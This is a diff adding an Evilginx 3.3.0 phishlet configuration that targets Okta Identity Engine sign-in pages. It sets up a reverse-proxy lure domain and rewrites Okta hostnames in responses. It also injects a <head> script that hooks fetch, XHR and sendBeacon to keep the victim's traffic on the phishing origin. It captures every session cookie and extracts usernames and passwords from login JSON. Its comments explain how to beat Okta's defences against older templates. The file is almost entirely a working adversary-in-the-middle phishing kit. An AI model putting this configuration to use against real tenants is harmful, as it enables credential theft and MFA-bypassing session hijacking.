@@ -1,0 +1,67 @@
+# Evilginx 3.3.0 community — Okta Identity Engine (IDX)
+#
+# Replace EVERY occurrence of EXAMPLE with the target tenant slug.
+#   acme.okta.com  →  EXAMPLE = acme
+#
+# Why the public VanGilder / simplerhacking templates fail on OIE:
+# 1) auto_filter never rewrites application/ion+json, so IDX hypermedia
+#    hrefs stay https://EXAMPLE.okta.com/idp/idx/identify → CORS.
+# 2) iris/enduser-v2 JS concatenates tenant + ".okta.com" at runtime, so
+#    static hostname replacement never sees the URL.
+# 3) js_inject in 3.3.0 is inserted before </body>, AFTER main.js runs.
+#    The fetch patch MUST be injected at <head> via sub_filters.
+# 4) copies often set triggers_on/domain to the tenant slug ("EXAMPLE")
+#    instead of the original hostname ("EXAMPLE.okta.com"), so the
+#    ion+json filter never fires.
+#
+# DNS: this phishlet only needs EXAMPLE.<phish-domain>. Wildcard not required.
+# Do not leave backup files (okta.yaml.bak*) in this directory — Evilginx 3.3
+# matches `*.yaml` unanchored and will load the backup as phishlet "okta".
+
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
+
+sub_filters:
+  # IDX responses: Content-Type: application/ion+json; okta-version=1.0.0
+  # Evilginx 3.3 auto_filter_mimes is only html/json/javascript.
+  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: 'EXAMPLE', domain: 'okta.com', search: '{hostname_regexp}', replace: '{hostname}', mimes: ['application/ion+json']}
+  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: 'EXAMPLE', domain: 'okta.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname}', mimes: ['application/ion+json', 'application/json', 'text/html']}
+
+  # Patch fetch/XHR in <head> before iris/enduser-v2 main.js.
+  # Rewrites any dynamically built https://EXAMPLE.okta.com/... to the lure origin.
+  - triggers_on: 'EXAMPLE.okta.com'
+    orig_sub: 'EXAMPLE'
+    domain: 'okta.com'
+    search: '<head>'
+    replace: '<head><script>(function(){var re=new RegExp("https://EXAMPLE(?:-admin)?\\.okta\\.com","gi");function rw(u){return typeof u==="string"?u.replace(re,location.origin):u;}var _f=window.fetch;window.fetch=function(i,t){if(typeof i==="string"){i=rw(i);}else if(i&&typeof i.url==="string"){t=t||i;i=rw(i.url);}return _f.call(this,i,t);};var _o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){arguments[1]=rw(u);return _o.apply(this,arguments);};if(navigator.sendBeacon){var _b=navigator.sendBeacon.bind(navigator);navigator.sendBeacon=function(u,d){return _b(rw(u),d);};}})();</script>'
+    mimes: ['text/html']
+
+auth_tokens:
+  # idx is a session cookie (no Max-Age) until the transaction finishes.
+  # .+:regexp + auth_urls avoids completing the session on the first IDX Set-Cookie
+  # (which happens at identify time, before password/MFA).
+  - domain: 'EXAMPLE.okta.com'
+    keys: ['.+:regexp']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: ''
+    search: '"identifier"\s*:\s*"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode"\s*:\s*"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'EXAMPLE.okta.com'
+  path: '/app/UserHome'
+
+auth_urls:
+  - '/enduser/callback'
+  - '/login/token/redirect'
+  - '/oauth2/v1/token'
+  - '/oauth2/.*/v1/token'
